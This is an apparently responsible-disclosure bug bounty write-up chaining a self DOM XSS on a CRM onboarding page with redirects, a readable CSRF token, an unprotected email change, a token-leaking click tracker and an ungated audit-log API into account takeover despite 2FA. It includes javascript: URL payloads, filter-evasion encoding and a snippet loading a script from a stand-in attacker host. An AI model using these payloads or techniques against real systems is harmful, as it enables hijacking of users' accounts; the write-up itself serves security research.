Self-DOM XSS to Account takeover

I found a self DOM XSS bug that seemed harmless, chained it with five minor bugs. Together, they turned one ordinary link into a complete account takeover.

August 24, 20269 minutes
XSS Account takeover Bug bounty Web security
Overview

Reported this in early 2023, against a long-running public program that had already received close to 1,000 bug reports.

I had been testing it for a long time when the team published a changelog post announcing that they had rewritten their login flows from scratch. One of the flows they described was one I had never tested, so I went back to look at the changes.

Out of curiosity, I ran wbu over their wildcard domain to pull every archived URL it knew about, then grepped the output for login and signup. That turned up a newer login flow, and that flow became the whole report.*.

Note

The endpoint names have been slightly altered because I was informed that one of the vulnerabilities used in the chain will not be fixed. The mechanics of the attack remain unchanged.

TLDR

This attack was not caused by one spectacular vulnerability. It was a chain of small weaknesses that happened to fit together.

Here is the chain:

  1. An onboarding page executed JavaScript supplied through a URL parameter. It happened automatically when the page loaded.
  2. To exploit it, I initially needed two pieces of information about the victim: their workspace ID and their regional server ("cell").
  3. A generic share link revealed the workspace ID from the victim's session.
  4. An old, global host automatically redirected users to the correct regional cell, removing the second requirement.
  5. The application allowed the account email address to be changed without asking for the password or notifying the old email address.
  6. The confirmation email was sent to the new address, which belonged to the attacker.
  7. The email's click-tracking system exposed the confirmation token inside a redirect.
  8. A separate audit-log API returned account history even for workspaces that were not supposed to have access to the feature.
  9. That account history could be used to answer the vendor's 2FA recovery questions.

Put together, these bugs turned a single link into an account takeover.

The victim did not have to enter a password, approve a prompt, or click a confirmation button.

The Whole Chain

The chain in full, with the endpoints. Every host and path below is a stand-in that keeps the shape of the original, and .tld is not a real top-level domain, so nothing here resolves against anything.

1 · The onboarding page ran a javascript: URL

The next parameter reached a client-side navigation call with no scheme check, so the value ran as code the moment the page loaded — no click, no interaction:

https://app-eu1.vantagecrm.tld/setup/{workspaceId}/sales-starter/complete?next=javascript:...

It ran on the application origin, inside the victim's authenticated session. But building that link needed two facts about the victim — their workspaceId and their cell — and I had neither. As it stood, it was self-XSS: useful against myself, useless against anybody else.

2 · A share link handed over the workspaceId

The vendor's own forum used a short-link format that carried no workspace number at all:

https://app-eu1.vantagecrm.tld/compactlink/<feature>/<object>

The handler resolved the workspace from the session and redirected to the normal URL. It was built as a convenience. It also accepted the vulnerable onboarding page as a destination:

https://app-eu1.vantagecrm.tld/compactlink/setup/sales-starter/complete?next=javascript:...

One unknown gone — the victim's own session now filled it in.

3 · The legacy host handed over the cell

Old accounts still lived on the global host, but it also answered for newer ones: rather than rejecting a request for a workspace that belonged elsewhere, it forwarded the user to the correct regional cell. So the regional prefix could go entirely:

https://app.vantagecrm.tld/compactlink/setup/sales-starter/complete?next=javascript:...

That one link now worked for old, EU and NA accounts, and for standard, developer and partner accounts alike. The application resolved both unknowns for me. The self-XSS was gone.

4 · The edge decided how the payload was spelled

Three hops sit between the click and the payload: the login round trip for a logged-out victim, the workspace-selection page for anyone in more than one workspace, and the final redirect to the real page on the correct cell. Each hop decodes the query string once, so the payload needs one encode layer per hop. I built the layers with Hackvertor:

https://app.vantagecrm.tld/compactlink/setup/sales-starter/complete<@urlencode_all><@urlencode>?next=javascript:<@urlencode>${PAYLOAD}<@/urlencode><@/urlencode><@/urlencode_all>

Then the edge pushed back twice. The origin returned 500 for the very long URLs that three encode passes produce, and the CDN returned 400 for <, >, the backtick and the space. Two changes fixed both: /**/ in place of every space, and the assignment operator written as a hex escape. The result appends one script tag to a container the page already has:

var/**/s=document.createElement('script');
s.src='https://attacker.tld/collect.js';
s.type='application/javascript';
var/**/i=document.getElementById('app-script-container');
i.appendChild(s);

5 · The CSRF token was not an obstacle

One token for the whole session — no fresh token per request — and it lived in a cookie JavaScript could read. collect.js reads it once and attaches it to everything it sends afterwards. From the server's side the requests are indistinguishable from the real interface: the victim's session cookie, a valid token, the expected origin.

6 · The email change asked for nothing else

No current password. No code to the old address. No notice to the old address, before the change or after it. And the confirmation mail goes to the new address — the attacker's:

attacker@attacker.tld

The victim's mailbox stays completely silent. This is the hinge of the whole chain, and it is not an XSS problem or a token problem. It is a design decision.

7 · The click tracker gave away the confirmation token

The mail lands in the attacker's mailbox, but the link inside is not direct — every link in the vendor's mail is wrapped for click tracking:

https://<id>.eu1.vantagelinks.tld/lnk/<campaign-ref>/<id>/<opaque-blob>

Clicking it normally records the click and lands on /confirm, which checks the token against the session — and the attacker holds the wrong session, so the normal path fails. But the wrapper also exposes its own decoder. Replace the routing prefix with the decoder path, add the throwaway tracking parameter, and no session is needed at all:

GET https://<id>.eu1.vantagelinks.tld/telemetry/public/v1/encoded/click/hop/<blob>?_tp=1337

307 Temporary Redirect
Location: https://app.vantagecrm.tld/confirm?e=<victim-address>&t=<confirmation-token>&u=<userId>

Reading a response header takes no authentication. The token and the userId go back to the script, which finishes the change from inside the victim's own session:

POST /api/accounts/v1/members/{userId}/confirmations/{token}

In the proof of concept that relay was manual: I pasted the tracked link into my listener and the listener passed the token to the script. The mail arrived in one or two seconds every time. An inbound-parse webhook on a domain you control removes the manual step entirely.

8 · The cancel button did not cancel

The change needs two to five minutes to reach every part of the product. In that window the security page still shows the old address, a Pending confirmation label, and a Cancel button.

The button does not work. The backend rejects the cancellation because the change is already committed — only the page is late. So the victim can do everything right and still lose the account:

  1. Open the security page inside the right minute.
  2. See an email address they do not recognise.
  3. Click the button the product offers.
  4. Watch the change complete anyway.

When it completes, the app invalidates every session on the account. The victim cannot log back in, because the address is no longer on the account — and the attacker runs "forgot password" on the new one.

9 · The audit log answered for workspaces that never had it

A central audit log of user actions, in beta behind two gates: the workspace needed an Enterprise plan, and an admin needed to opt it into the beta. Without both, no card, no menu entry, no data. The interface respected both gates. The API respected neither:

GET /api/member-audit/v1/events?ui_app=settings-ui-audit&ui_app_version=1.x&workspaceId={id}

The test was two workspaces — A on Enterprise with the beta, B with neither. Same request, B's cookie, B's workspaceId, and the server returned B's audit events. Two browser profiles keep a test like that honest; PwnFox gives each profile a colour so the sessions cannot be confused.

Every event also carries an object reference that expands into the full detail of one action: what changed, when it changed, and who changed it. That is account history — remember it for the next step.

10 · 2FA stopped the login, not the attack

If the victim is an admin. The lost-device flow offers a security question form that asks the user to describe their own account history — exactly the data the audit log just handed over, and the script already collected it. The vendor reviews the form for 24 to 72 hours, and every recovery mail goes to the address on the account, which is the attacker's.

If the victim is a member. No form. A member has to ask a workspace admin to remove 2FA, which sends an approval link to the admin and the removal code to the address on the account — the attacker's again. The result is a deadlock:

  • The admin can approve the request, but cannot read the code.
  • The attacker holds the code, but cannot read the audit log, so cannot answer the form.
  • Nobody recovers the account.

One link, and the account is gone for good.

The whole thing, as one sequence

The script's work ends when the confirmation mail arrives. Everything after that point is the attacker using ordinary product flows, as an ordinary user — and from the victim's side there was no password prompt, no second-factor prompt, no mail to the old address and no notice inside the product. The first sign is being logged out of an account that is no longer theirs.

Based on the program's description, the XSS-to-account-takeover impact—including accounts protected by 2FA—was initially triaged as P1, since 2FA-enabled accounts were also affected. Later, one of the chains (the email-change chain) was identified as an internal duplicate, so the overall severity was downgraded to P2.

Takeaways

When I reported the issue, their security team told me they had not known this complete flow existed.

Important

Age and maturity do not protect a program: every change developers ship is new, unreviewed attack surface. Test each new feature and code path as if you are the first person ever to look at it.
